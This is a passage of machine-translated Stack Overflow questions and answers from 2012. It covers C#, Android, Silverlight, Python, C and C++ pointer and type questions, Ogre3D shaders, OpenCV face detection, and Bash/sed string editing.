至于多个等待者，是的，您可以这样做。我确信我在某处看到了来自 MS 的示例代码，其中显示了优化，例如结果`Task.FromResult(0)`存储在静态成员中，并在函数想要返回零时返回。

但是，我未能成功找到此代码示例。

# c# - 无法在远程计算机上执行命令

> ID：13530160
> 
> 赞同：0
> 
> 时间：2012-11-23T13:30:48.960
> 
> 标签：c#, linux

我有 Linux 脚本和两台不同的 Solaris 机器，一台是`ISO-8859-1`另一台`UTF-8`

当我使用它运行它时，`UTF-8`它工作正常，但使用 ISO 时出现错误：

我需要如何执行它。

如果我将我的脚本复制到 solaris 有 iso 并在那里执行它工作正常没有错误

我的执行代码：

```
using (var sftp = new Sftp())
{
  try
    {
      sftp.Connect(target.FullyQualifiedDomainName);
      sftp.Authenticate(target.UserName, crypto.TwoWayDecrypt(target.Password));
      sftp.Put(AssemblyDirectory + "\\Scripts\\solaris_perf_data.sh", "perf_data.sh", CopyMode.Copy);
    }
  finally
    {
      sftp.Close();
    }
}

ssh.Execute(chModCommand);

//error here 
result =   ssh.Execute(executeCommand).ToString(); 
```

我得到的错误是：

```
copying script file and executing script on host Solaris 10 region settings 
(france). Error Message: System.IO.IOException: ./perf_data.sh[5]: 
TotSize==+utilisés,: numéro incorrect at Dart.Ssh.Ssh.Execute(String command, 
Object state) at   Virtustream.CAS.DataCollector.Library.DataCollectors.SolarisDataCollector.GetDat‌​a(Boolean 
isInventory, String subject, String executeCommand) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T13:42:29.710

要么您在脚本中编码了特定字符（通常在注释中：-D），要么您在您的机器上没有相同的权限

# android - 如何编写基于 xml 布局的自定义 View 类

> ID：13530164
> 
> 赞同：1
> 
> 时间：2012-11-23T13:31:04.667
> 
> 标签：android, android-layout, android-custom-view

我有一个带有 4-5 个子视图的 RelativeLayout 的 xml 布局。我想有一个基于这个 xml 布局的自定义 View 类和一个自定义的 onclick 列表。

我尝试通过扩展 RelativeLayout 并将 View 作为成员来使用自定义类。在我的构造函数中，我正在膨胀布局并将其分配给我的 View 成员。但我想让类本身类似于我的膨胀视图对象。（我有什么意义吗！！）

我当前的代码类似于以下：

```
public class CustomItemView extends RelativeLayout {
  private Context context;
  private View itemView;

  public CustomItemView(Context context) {
    super(context);
    this.context = context;

     LayoutInflater inflater = (LayoutInflater) context
            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);

      itemView = inflater.inflate(layout, null);                
  }

  public View getView() {
    return itemView;
  }       
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T13:35:13.790

实现它的一种简单方法是在构造函数中扩展`FrameLayout`并附加膨胀的布局到自己（`this`）：

```
public class MyView extends FrameLayout {

    public MyView(Context context, AttributeSet attrs) {
        super(context, attrs);
        LayoutInflater.from(context).inflate(R.layout.my_view, this);
    }

    // Your view logic here
} 
```

然后您可以以编程方式使用您的全新视图：

```
MyView myView = new MyView(context); 
```

或者在 XML 布局中：

```
<packageName.MyView
    android:layout_width="match_parent"
    android:layout_height="match_parent" /> 
```

# security - Silverlight 的 SaveFileDialog 给出错误“对话框必须由用户启动”

> ID：13530165
> 
> 赞同：6
> 
> 时间：2012-11-23T13:31:07.673
> 
> 标签：security, silverlight-5.0, savefiledialog

我收到一个错误：

> ```
> Dialog must be user-initiated 
> ```

当我从 silverlight 应用程序打开保存文件对话框时，我正在使用以下代码

主按钮点击事件：

```
 private void btnSaveAttach_Click(object sender, RoutedEventArgs e)
        {
            if (EditableGV.SelectedItems.Count == 1)
            {
                PositionAttachment posAtt = new PositionAttachment();
                posAtt = (PositionAttachment)EditableGV.SelectedItems[0];
                SaveFile(posAtt.File, posAtt.FileName);

            }
            else
            {
                RadWindow.Alert("Please select a attachment from the existing attachments list.", null);
                return;
            }

        }

private void SaveFile(byte[] fileByte, string fileName)
    {
        try
        {
            byte[] fileBytes = fileByte;//your bytes here 

            //Show the dialog        

            SaveFileDialog dialog2 = new SaveFileDialog();
            saveDialog = dialog2.ShowDialog();//This line is giving the error

            if (saveDialog == true)
            {
                //Get the file stream
                dialog2.DefaultFileName = fileName;
                string fileExt = fileName.Substring(fileName.LastIndexOf('.'), fileName.Length);
                dialog2.DefaultExt = "All Files|*.*|" + fileExt + "|*." + fileExt + "";
                using (Stream fs = (Stream)dialog2.OpenFile())
                {
                    fs.Write(fileBytes, 0, fileBytes.Length);
                    fs.Close();

                    //File successfully saved
                }
            }
        }
        catch 
        {
            MessageBox.Show("Error in downloading file");
        }
    } 
```

XMAL 代码：

```
<StackPanel x:Name="Layout">
    <StackPanel x:Name="Messagepanel" Margin="2" Visibility="Collapsed">
        <TextBlock x:Name="txtMessage" Text="1"  Height="35"></TextBlock>
    </StackPanel>
    <StackPanel Orientation="Horizontal" Margin="4">
        <sdk:Label Height="28" Content="Select File:"   Name="lblSelectFile" Grid.Column="0" Grid.Row="0"  Width="70" />
        <TextBox Name="txtFileName" IsReadOnly="True" HorizontalAlignment="Left" VerticalAlignment="Center"  Width="303" Grid.Column="1" Margin="12,1,0,0"></TextBox>
        <Button Content="Browse" Name="btnBrows" Width="55" Height="22"  HorizontalAlignment="Left" VerticalAlignment="Center" Margin="16,1,0,0" Click="btnBrows_Click" Grid.Column="1" />
    </StackPanel>
    <StackPanel Orientation="Horizontal" Margin="4">
        <sdk:Label Height="28" Content="Description:"   Name="lblFileDescription" Grid.Column="0" Grid.Row="1"  Width="70" />
        <TextBox Height="60"   Name="txtComments" Grid.Column="1" 
         VerticalScrollBarVisibility="Auto" Width="301" Margin="13,0,85,2" Grid.Row="1" />
    </StackPanel>
    <StackPanel Orientation="Horizontal" Margin="4">

        <Button x:Name="OKButton" Content="Add" Click="OKButton_Click" Width="43" Margin="363,6,10,15" Grid.Row="2" Grid.Column="1" HorizontalAlignment="Left" />

        <Button x:Name="CancelButton" Content="Cancel" Click="CancelButton_Click" Width="53" HorizontalAlignment="Right" Margin="0,6,200,15" Grid.Row="2" Grid.Column="1" />
    </StackPanel>
    <StackPanel Orientation="Vertical" Margin="4" Height="224">
        <sdk:Label Content="Existing Attachment(s):" Height="20" Margin="15,7,324,10" Name="lblExistingAttachemnt"  />
        <telerikGrid:RadGridView x:FieldModifier="public" 
                         x:Name="EditableGV" 
                         AutoGenerateColumns="False" 
                         ItemsSource="{Binding PositionAttachemntCollection, Mode=TwoWay}" Margin="0,0,0,7" Height="150">
            <telerik:RadGridView.Columns>
                <telerik:GridViewDataColumn DataMemberBinding="{Binding FileName,Mode=TwoWay}"></telerik:GridViewDataColumn>
                <telerik:GridViewDataColumn DataMemberBinding="{Binding FileDescription,Mode=TwoWay}"></telerik:GridViewDataColumn>
                <!--<telerik:GridViewColumn Header="" >
                    <telerik:GridViewColumn.CellTemplate>
                        <DataTemplate>
                            <telerik:RadButton Name="btnDownlaod" Content="Save" Click="HyperlinkButton_Click"></telerik:RadButton>
                            <<HyperlinkButton Click="HyperlinkButton_Click"  Content="{Binding FileName,Mode=OneWay}" TargetName="_blank" NavigateUri="http://www.google.com" />
                        </DataTemplate>
                    </telerik:GridViewColumn.CellTemplate>
                </telerik:GridViewColumn>-->
            </telerik:RadGridView.Columns>
        </telerikGrid:RadGridView>

        <StackPanel Orientation="Horizontal" Margin="0">
            <!--<Button Content="Save Attachment" Name="btnSaveAttach" Width="112" Margin="263,6,10,15"  Click="btnSaveAttach_Click" />-->
            <Button Content="Close" Name="btnClose" Width="75" Margin="3,6,10,15" Click="btnClose_Click" />
        </StackPanel>

    </StackPanel>
</StackPanel> 
```

此函数调用按钮单击。我想知道我在同一页面上也有一个 openFiledialog，但是成功地打开了对话框而没有任何错误。为什么那个保存文件对话框会导致错误。

以下是错误的堆栈跟踪：

```
 at System.Windows.Controls.SaveFileDialog.ShowDialogInternal(Window owner)
   at System.Windows.Controls.SaveFileDialog.ShowDialog()
   at IPVWorkbench.Views.AddPositionAttachments.btnSaveAttach_Click(Object sender, RoutedEventArgs e)
   at System.Windows.Controls.Primitives.ButtonBase.OnClick()
   at System.Windows.Controls.Button.OnClick()
   at System.Windows.Controls.Primitives.ButtonBase.OnMouseLeftButtonUp(MouseButtonEventArgs e)
   at System.Windows.Controls.Control.OnMouseLeftButtonUp(Control ctrl, EventArgs e)
   at MS.Internal.JoltHelper.FireEvent(IntPtr unmanagedObj, IntPtr unmanagedObjArgs, Int32 argsTypeIndex, Int32 actualArgsTypeIndex, String eventName, UInt32 flags) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-02T09:53:03.433

答案在这里给出：http: [//social.msdn.microsoft.com/Forums/en-US/lightswitch/thread/8c6529ab-8967-45e8-9e19-920589b060c1](http://social.msdn.microsoft.com/Forums/en-US/lightswitch/thread/8c6529ab-8967-45e8-9e19-920589b060c1)

这是一种“安全功能”：

基本上，您必须直接打开 SaveFileDialog 或 OpenFileDialog 以响应由用户操作（例如单击）引起的事件，这些操作仅在主线程上引发。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-27T13:16:29.703

您需要在 btnSaveAttach_Click 中显示 SaveFileDialog（这样它是用户启动的）。还要[删除所有断点](https://stackoverflow.com/a/8765121/266474)，因为它们也会产生该错误。

试试这个，看看它是否有效，然后基于它构建其余的代码：

```
private void btnSaveAttach_Click(object sender, RoutedEventArgs e)
{
    SaveFileDialog dialog2 = new SaveFileDialog();
    saveDialog = dialog2.ShowDialog();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-02T09:14:53.700

我找到了解决方法。我在按钮单击和确认框的“确定”事件上显示了一个确认框，我打开了保存文件对话框，这样它就不会抛出任何异常。

# python - 使 python itertools 在多种条件下工作

> ID：13530172
> 
> 赞同：1
> 
> 时间：2012-11-23T13:31:48.357
> 
> 标签：python, itertools

我正在尝试学习 python itertools（到目前为止喜欢它！），但我遇到了一个问题。我有以下两个列表：

```
a=["http://www.xyz.com/jhuh7287", "http://www.hjuk.com/kashjh716", "http://www.psudjg.com/9279jshkoh", "http://www.xyz.com/jhuh7287",  "http://www.xyz.com/9289jhjbg"]
data=["k","some small string here", "so med string here", "some string here","l"]
tempstring="http://www.xyz.com" 
```

最初，我想要的是删除低于一定长度的所有字符串的 data[i]，然后删除 a.xml 中的相应条目。为此，我使用了以下内容：

```
iselectors = [x is not len(str(x))>1 for x in data]
data=list(itertools.compress(data, iselectors))
a=list(itertools.compress(a, selectors)) 
```

..效果很好。现在，我需要向我的 iselector 添加另一个条件，它指出只有当“tempstring is in a[i]”并且 len(str(x))>1..

所以，我尝试过类似的方法：

```
iselectors = [tempstring in a and x is not len(str(x))>1 for x in data] 
```

...但我不确定这是正确的，因为当我使用“tempstring in a”时，我认为我不会遍历整个 a

任何指导将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:50:02.693

我认为你只需要同时迭代两者

```
iselectors = [len(str(x))>1 and tempstring in y for x,y in zip(data,a)] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T13:50:42.163

最简单的方法是完成它：

```
>>> pprint(zip(data, a))
[('k', 'http://www.xyz.com/jhuh7287'),
 ('some small string here', 'http://www.hjuk.com/kashjh716'),
 ('so med string here', 'http://www.psudjg.com/9279jshkoh'),
 ('some string here', 'http://www.xyz.com/jhuh7287'),
 ('l', 'http://www.xyz.com/9289jhjbg')]

>>> [ (av, dv) for av, dv in zip(a, data) if len(av) > 1 and tempstring in av]
[('http://www.xyz.com/jhuh7287', 'k'), ('http://www.xyz.com/jhuh7287', 'some string here'), ('http://www.xyz.com/9289jhjbg', 'l')] 
```

所以通过一些重构：

```
selectors = (tempstring in dv for av, dv in izip(a, data) if len(av) > 1) 
```

而且由于@mgilson 删除了他的一个关键点的答案——我希望 OP 已经采纳了这一点，我将重新发布他对这个答案的措辞：

> 此外，`is`用于比较对象身份。虽然此检查适用于 Cpython 中的小整数（1 是 len(str(1))），但不能保证与其他 python 实现一起使用（也不保证将来在 Cpython 中也可以使用）。我想你只想要 len(str(x))>1。

# css - 使用在单独的 CSS 文件中定义的自定义字体

> ID：13530174
> 
> 赞同：3
> 
> 时间：2012-11-23T13:31:58.513
> 
> 标签：css, fonts, custom-font

> **可能重复：**
> [@import 和 CSS 中的链接之间的区别](https://stackoverflow.com/questions/1022695/difference-between-import-and-link-in-css)

我有一个`.css`定义所有自定义字体的文件，我想在`.css`不同页面的其他单独文件中引用这些字体。

这样做的正确方法是什么？或为每个页面`@import`加载两个文件？`.css`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:40:27.620

我不确定@import 是否是一个好方法：

[CSS中@import和link的区别](https://stackoverflow.com/questions/1022695/difference-between-import-and-link-in-css)

您应该选择 @import 之前的链接以获得性能。您可能想看看 LESS 或 SASS，例如提到的toxicate20。

祝你好运！

# c - 为什么 char * 不能接收正确的值？

> ID：13530179
> 
> 赞同：0
> 
> 时间：2012-11-23T13:32:28.577
> 
> 标签：c, malloc, heap-memory

有人可以帮我解释以下代码：

为什么`char *s`没有收到分配的内存的点位置`foo()`？

```
#include <stdio.h>
#include <stdlib.h>

char *foo()
{
    char *s = (char *)malloc(20);
    s = "Hello Heap.";
    return s;
}

void bar(char *s)
{
    s = foo();
    printf("bar: %s\n", s); // Works fine just as expected.
}

int main()
{
    char *s;
    bar(s);
    printf("%s\n", s); // Output some undefined content like `H?}?H??`, other than `Hello Heap.`
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T13:34:55.203

代码已修复

```
#include <stdio.h>
#include <stdlib.h>

char *foo()
{
    char *s = (char *)malloc(20);
    strcpy(s,"Hello Heap.");
    return s;
}

void bar(char **s)
{
    *s = foo();
    printf("bar: %s\n", *s); // Works fine just as expected.
}

int main()
{
    char *s;
    bar(&s);
    printf("%s\n", s); // Output some undefined content like `H?}?H??`, other than `Hello Heap.`
} 
```

**解释：**

1）您的代码包含：

```
char *s = (char *)malloc(20);
 s = "Hello Heap."; 
```

这不好。通过这种方式，您不会将`"Hello Heap."`消息复制到分配的内存中。实际上，您已将 s 指针指向已分配的内存，然后将指针指向了一个常量字符串地址

2）您的代码包含

```
void bar(char *s)
{
    s = foo();
    printf("bar: %s\n", s); // Works fine just as expected.
} 
```

在这个函数`s`中是从函数中获取指针（指向已分配内存的指针）`foo()`。但是您没有将`s`指针地址传递给更高级别的函数（`main`）。你必须返回`s`函数末尾的地址，或者你可以使用输入参数通过指针地址的地址传递`cha ** s`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:49:45.220

```
char *foo()
{
    char *s = (char *)malloc(20);
    s = "Hello Heap.";
    return s;
} 
```

这里`s`foo 对 foo 是本地的，在分配之后，您实际上是在分配“Hello heap”，它是字符串文字，而不是在堆上（请注意）。但无论如何 s="Hello heap" 是正确的，并且返回的 s 被捕获`bar`并且`s`您正在打印。

现在想想主要的，

`bar(s)`很好，但在`printf`你`s`使用的是本地到 main 所以打印其他东西，这不是`s`你在`bar`

你应该试试这个：

像这样调用主要，`bar(&s)`

并更改 as 的签名`bar(char **s)`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T13:37:01.093

您必须在内存分配后使用 StrCpy 或 strncpy。

你不能说 's' 等于 ""

这在 C 中不是 tru。这是一个肮脏的例子，但尝试这样做：

```
 s[0] = 'h';
s[1] = 'e';
s[2] = 'l';
s[3] = '\0'; 
```

您在分配过程中遗漏了一些东西；）

# regex - 正则表达式替换

> ID：13530182
> 
> 赞同：3
> 
> 时间：2012-11-23T13:32:39.527
> 
> 标签：regex, linux, sed, gnu

我正在尝试对典型的 g++ 命令行进行一些修改。我正在尝试构建一个寻找构造的正则表达式`-o object_filename.o`。为了测试我的匹配模式，我在 sed 中用一个空字符串作为替换启动它。但它没有按预期工作，因为它什么都没有删除......

`$echo "-o toto.o" | sed 's/-o [^ ]+//'
-o toto.o`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:37:42.700

你缺少`-E`一面旗帜；[没有它，`+`不会被视为正则表达式元字符](https://stackoverflow.com/a/4453890/335858)：

```
$echo "-o toto.o" | sed -E 's/-o [^ ]+//' 
```

正如预期的那样，上面产生了一个空输出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:41:25.933

如果我理解正确，那么`sed -E 's/-o.+?\.o//'`应该做你想做的事：

```
$ cat file

g++ .. -o object_filename.o some more options
g++ .. -o object1.o some more options
g++ .. -o foo_bar.o some more options

$ sed -E 's/-o.+?\.o//' file

g++ ..  some more options
g++ ..  some more options
g++ ..  some more options 
```

# java - 我应该在 Game 中创建 GUI 实例还是相反？

> ID：13530190
> 
> 赞同：0
> 
> 时间：2012-11-23T13:32:59.507
> 
> 标签：java, user-interface

我有两个类：`GUI`和`Game`，分别处理 GUI 逻辑和游戏逻辑。

我应该做一个`GUI`in的实例`Game`，还是一个`Game`in的实例`GUI`。

如果它有任何区别：它是Java。

更多解释：

我正在用 Java 制作一个生命克隆游戏，但在更新我的 GUI 时遇到了一些问题。在继续解决这些问题之前，我想知道使用 GUI 的正确方法是什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T13:41:50.573

两者都不。

我建议您按照[Model-View-Controller](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller)习惯用法构建您的应用程序。

游戏状态（模型）和它的视觉表示（视图）不应相互依赖。两者都应该由一个控制器（或多个控制器）创建和操作。

这种应用程序设计的优点是您可以轻松地更改其中一个组件（甚至完全替换它们），而无需接触另一个组件。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T13:41:02.620

通常，您可以将您的应用程序视为分层的。可以假设 UI 层位于应用程序层的“之上”。关于依赖关系，这是相互影响的，因此`UI`可以依赖`Game`, bot 而不是相反。

你可以这样想——“我应该能够改变哪一部分而不强迫另一部分也改变？” 我的猜测是，您希望能够在`UI`不更改`Game`. 反过来，它的意义就大大降低了。因此，结果再次是`UI`应该依赖于`Game`并包含对它的引用。

编辑：关于 MVC 架构。使用 MVC 并不意味着视图只能通过控制器从模型中检索它的值。应该使用控制器更改值，但视图通常仍然具有对模型的引用来显示它。控制器通常对模型显示没有附加价值。

# c - 如何在C中将int转换为float？

> ID：13530209
> 
> 赞同：26
> 
> 时间：2012-11-23T13:34:43.737
> 
> 标签：c, int

我正在尝试解决：

```
int total=0, number=0;
float percentage=0.0;

percentage=(number/total)*100;
printf("%.2f", percentage); 
```

如果数字的值是 50 并且总数是 100，我应该得到 50.00 的百分比，这就是我想要的。但我一直得到 0.00 作为答案，并尝试了对类型的许多更改，但它们没有奏效。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-11-23T13:40:34.873

整数除法会截断，因此`(50/100)`结果为 0。您可以先转换为`float`(better `double`) 或乘以`100.0`(for `double`precision, `100.0f`for `float`precision)，

```
double percentage;
// ...
percentage = 100.0*number/total;
// percentage = (double)number/total * 100; 
```

或者

```
float percentage;
// ...
percentage = (float)number/total * 100;
// percentage = 100.0f*number/total; 
```

由于浮点运算不具有关联性， 和 的结果`100.0*number/total`可能`(double)number/total * 100`略有不同（对于 也是`float`如此），但极不可能影响小数点后的前两位，因此您选择哪种方式可能并不重要。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-23T13:40:03.310

C中的整数除法会截断结果，所以`50/100`会给你`0`

如果您想获得所需的结果，请尝试以下操作：

```
((float)number/total)*100 
```

或者

```
50.0/100 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-23T13:39:32.610

不，因为您使用整数进行表达式，所以您将*整数*50 除以*整数*100，结果为*整数*0。将其中一个类型转换为 a `float`，它应该可以工作。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-23T13:39:37.713

你正在做整数算术，所以结果是正确的。尝试

```
percentage=((double)number/total)*100; 
```

顺便说一句，`%f`期望 a`double`不是 a `float`。纯粹靠运气在这里转换，所以效果很好。但通常你现在主要`double`在 C 中用作浮点类型。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-06-13T01:57:53.127

如果我想要浮点数，我通常会乘以 1.0，这比记住规则要容易。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-23T13:41:05.787

这应该会给你你想要的结果。

```
double total = 0;
int number = 0;
float percentage = number / total * 100
printf("%.2f",percentage); 
```

请注意，第一个操作数是双精度

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-23T14:21:37.280

将您的代码更改为：

```
int total=0, number=0;
float percentage=0.0f;

percentage=((float)number/total)*100f;
printf("%.2f", (double)percentage); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-12-16T03:01:25.000

这可以给你正确的答案

```
#include <stdio.h>
int main()
{
    float total=100, number=50;
    float percentage;
    percentage=(number/total)*100;
    printf("%0.2f",percentage);
    return 0;
} 
```

# c++ - C++ 中的普通常量变量

> ID：13530212
> 
> 赞同：9
> 
> 时间：2012-11-23T13:35:03.660
> 
> 标签：c++, constants, linkage

C++ 中的普通常量变量默认为内部链接。假设如果我有以下内容：

*   我在头文件中定义了一个常量变量（`const int var = 2`）

*   然后我将标题包含在两个 cpp 文件中。

如果我尝试在两个 cpp 文件中获取该 const 变量的地址（即`&var`），那么这两个地址是否相同？我还需要一个小的工作代码来验证这个事实。

我不得不将其发布为一个问题，因为我是新手，因此无法在此线程中给出的[答案的评论中问它。](https://stackoverflow.com/a/2328715/160206)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T13:41:20.807

由于`C++`内部链接，它不会相同 - 这是两个不同的对象。反之亦然，`C`并且`const`将具有外部链接，因此由于重新定义，您将收到链接错误。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T15:23:48.260

> 那么这两个地址会相同吗？

不会。因为头文件在编译期间包含在 *.cpp 文件中，所以每个包含头文件的 *.cpp 都会创建自己的常量。

但是，如果您`extern const int var;`在 header 中使用并在 *.cpp 中设置默认值，它们应该是相同的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:03:51.237

变量将具有**不同**的地址。也有可能，如果您没有在任何地方引用变量地址，则变量将在编译期间用他的值替换，并且在二进制文件中您根本找不到变量值。

# cakephp - Cakephp : 创建一个在 cakephp 2 中捕获和保存数据的电子表格

> ID：13530215
> 
> 赞同：0
> 
> 时间：2012-11-23T13:35:09.983
> 
> 标签：cakephp, cakephp-2.0, cakephp-2.1, phpexcel, vendors

嗨，伙计们，我有一个在 cakephp 中运行的系统，我需要创建一个平台来捕获标记并将它们计算为 30 的百分比，换句话说，我应该对 excel 的函数进行建模（包括加法和乘法的公式）进入 cakephp 应用程序。我已经通过 PHPExcel 但我失败了。知道我可以使用什么吗？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:42:01.123

```
$mark = 25;
$percentage = $mark / 30 * 100; 
```

或使用 Excel，如果标记在单元格 B1 中，则 C1 公式为

```
=B1/30*100 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:01:40.590

这与 CakePHP 无关。我会说，使用Javascript。

在这里你有一个很棒的插件来处理表格： [http ://handsontable.com/](http://handsontable.com/)

我几天前在这里找到了它，由@warpech 创建： [https ://stackoverflow.com/a/9997458/1081396](https://stackoverflow.com/a/9997458/1081396)

# c++ - Ogre3d / 合成器相关问题

> ID：13530224
> 
> 赞同：0
> 
> 时间：2012-11-23T13:35:52.277
> 
> 标签：c++, directx, shader, ogre, cg

我花了一整天的时间想弄清楚为什么下面的代码不起作用：

我有这个 .compositor 脚本：

```
compositor BW
{
    technique
    {
        texture rt0 target_width target_height PF_A8R8G8B8

        target rt0
        {
            input previous
        }

        target_output
        {
            input none

            pass render_quad
            {
                material BlackAndWhite
                input 0 scene
            }
        }
    }
} 
```

.material 脚本：

```
vertex_program BW_VP cg
{
    source MyShader.cg
    entry_point BW_VP
    profiles vs_4_0 vs_2_0 vs_1_1 arbvp1

    default_params
    {
        param_named_auto worldViewProj worldviewproj_matrix
    }
}

fragment_program BW_FP cg
{
    source MyShader.cg
    entry_point BW_FP
    profiles ps_4_0 ps_2_0 arbfp1
}

material BlackAndWhite
{
    technique
    {
        vertex_program_ref BW_VP{}
        fragment_program_ref BW_FP{}

        texture_unit
        {
            texture rt0
            tex_coord_set 0
            tex_address_mode clamp
            filtering none
        }
    }
} 
```

和一个 .cg 程序：

```
sampler2D RT : register(s0);

void BW_VP(in float4 inPos : POSITION, out float4 pos : POSITION, out float2 uv0 : TEXCOORD0, uniform float4x4 worldViewProj)
{
    pos = mul(worldViewProj, inPos);
    inPos.xy = sign(inPos.xy);
    uv0 = (float2(inPos.x, -inPos.y) + 1.0f) * 0.5f;
}

float4 BW_FP(float4 pos : POSITION, float2 iTexCoord : TEXCOORD0) : COLOR
{
    float3 greyscale = dot(tex2D(RT, iTexCoord).rgb, float3(0.3, 0.59, 0.11));
    return float4(greyscale, 1.0);
} 
```

我使用下面的语句来初始化合成器：

```
Ogre::CompositorManager::getSingleton().addCompositor(mViewport, "BW");
Ogre::CompositorManager::getSingleton().setCompositorEnabled(mViewport, "BW", true); 
```

我根本看不到任何结果。我的场景中有几个灯光和 cg 着色器——它们工作得很好。此外，所有资源都已正确加载，并且资源组可以看到每个需要的文件，但是我在日志文件中得到了这个异常：

```
OGRE EXCEPTION(6:FileNotFoundException): Cannot locate resource rt0 in resource group Mission 1 : Deliver Tom or any other group. in ResourceGroupManager::openResource at D:\ARCHIVES\DEPENDENCIES\OGRE_REPOSITORY\OgreMain\src\OgreResourceGroupManager.cpp (line 756) 
```

AFAIK rt0 不应该是一种资源，因为它是由食人魔“在飞行中”自动生成的。我错过了什么吗？

任何帮助表示赞赏！谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T15:24:34.197

异常错误是*正确*的：您没有具有该名称的纹理文件资源，但是 OGRE 将为您创建一个空白纹理。

但是我看到两个问题：

1.  在合成器文件中什么是*场景*？您必须使用**rt0**而不是**场景**，这是渲染场景的渲染目标以及应用材质的位置。
***   材质脚本中缺少*pass*语句。**

# c++ - OpenCV - 人脸检测：人脸周围的矩形

> ID：13530236
> 
> 赞同：0
> 
> 时间：2012-11-23T13:37:01.063
> 
> 标签：c++, c, opencv

我从 OpenCV 开始，想测试一些样本。我使用的示例在屏幕中的面部周围放置了一个矩形。但是结果检测是不稳定和零星的，如何改进我的代码以使检测更顺畅？我使用 haarcascade_frontalface_alt.xml。

```
void detectAndDisplay( Mat frame )
{
   vector<Rect> faces;
   Mat frame_gray;
   cvtColor( frame, frame_gray, CV_BGR2GRAY );
   equalizeHist( frame_gray, frame_gray );

   face_cascade.detectMultiScale( frame_gray, faces, 1.1, 2, 0, Size(40, 40) );
   for( size_t i = 0; i < faces.size(); i++ )
   {
      Mat faceROI = frame_gray( faces[i] );
      int x = faces[i].x;
      int y = faces[i].y;
      int h = y+faces[i].height;
      int w = x+faces[i].width;
      rectangle(frame,
          Point (x,y),
          Point (w,h),
          Scalar(255,0,255),
          2,
          8,
          0);
    }
imshow( "Capture - Face detection", frame );
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:48:36.110

从您的评论来看，您实际上是在视频序列中的每一帧检测人脸，这是零星的，这就是您对结果不满意的地方。如我错了请纠正我。

您在 YouTube 上看到的剪辑很可能是根据检测到的人脸进行跟踪的。在视频序列的第一帧中检测人脸是很常见的，然后将其用作跟踪算法的种子输入来跟踪人脸。OpenCV 有[许多跟踪算法](http://docs.opencv.org/modules/video/doc/motion_analysis_and_object_tracking.html)，例如 Mean Shift 和 Kalman Filter 跟踪器，可以让您跟踪面部。这些跟踪器的结果将比在每一帧进行检测要平滑得多。

# string - 使用 Bash 替换文本文件中的字符串

> ID：13530239
> 
> 赞同：1
> 
> 时间：2012-11-23T13:37:12.273
> 
> 标签：string, bash, shell, replace

我有一些非常简单的问题困扰了我一整天：

1.  我怎样才能得到第一个号码`$variable`？

2.  如何删除之前的第一个数字`";"`？

3.  如何更改号码`$updateNum`？

`$updateNum= 1`

```
$variable="2;,A1,A2,A3,A4,A5,A6,A7,B1,B2,B3,B4,B5,B6,B7,C1,C2,C3,C4,C5,C6,C7,D1,D2,D3,D4,D5,D6,D7,E1,E2,E3,E4,E5,E6,E7,F1,F2,F3,F4,F5,F6,F7,G1,G2,G3,G4,G5"` 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:39:24.133

尝试：

```
oldVal="${variable%%;*}"
variable="$updateNum;${variable#*;}" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:45:21.003

这将一次性完成：

`variable=$(echo $variable | sed -E "s/[0-9]+?/$updateNum/")`

基准：

```
time variable=$(echo $variable | sed -E "s/[0-9]+?/$updateNum/") 

real    0m0.002s
user    0m0.001s
sys     0m0.000s 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-23T14:06:23.627

FIRST NUMBER: `echo $variable | sed '/[^[:digit:]]*\([[:digit:]]*\).*/ s::\1:'`

the others can be done identically

# mysql - ResultSet 关闭后不允许操作 9030

> ID：13530241
> 
> 赞同：0
> 
> 时间：2012-11-23T13:37:20.927
> 
> 标签：mysql, resultset, sqlexception

在我的代码中的 ResultSet 关闭错误后，我得到 Operation not allowed 。我的代码如下。我正在使用一种方法来计算薪水，然后我在对象中设置了这个薪水。

```
 try {
            while (rs.next()){
                int sala = 0;
                int sa = Integer.parseInt(rs.getString(4));
                int lea = Integer.parseInt(rs.getString(5));
                String name = rs.getString(2);
                sala = getsalary(name, fromdate, todate, lea, sa);

                s.setEmpid(Integer.parseInt(rs.getString(1)));
                s.setEmpname(rs.getString(2));
                s.setEmpcat(rs.getString(3));
                s.setSalary(sala);
                s.setLeaves(Integer.parseInt(rs.getString(5)));
